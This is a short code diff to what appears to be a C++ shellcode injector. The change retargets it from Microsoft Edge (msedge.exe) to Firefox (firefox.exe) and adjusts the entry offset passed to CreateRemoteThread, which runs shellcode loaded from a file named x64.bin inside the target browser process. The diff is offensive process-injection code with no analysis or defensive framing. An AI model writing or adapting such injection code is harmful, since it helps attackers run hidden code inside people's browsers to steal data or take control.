@@ -4,7 +4,7 @@
 #include <iostream>
 
 int main() {
-	std::wstring wsTargetProcessName = L"msedge.exe";
+	std::wstring wsTargetProcessName = L"firefox.exe";
 	std::wstring wsShellcodePath = L"x64.bin";
 
 	HANDLE hTargetProcess = GetProcessHandleByNameW(wsTargetProcessName);
@@ -31,5 +31,5 @@ int main() {
 		return -1;
 	}
 
-	CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD64)lpRemoteAddr + 0x118e9), NULL, 0, NULL);
+	CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD64)lpRemoteAddr + 0x3A19), NULL, 0, NULL);
 }
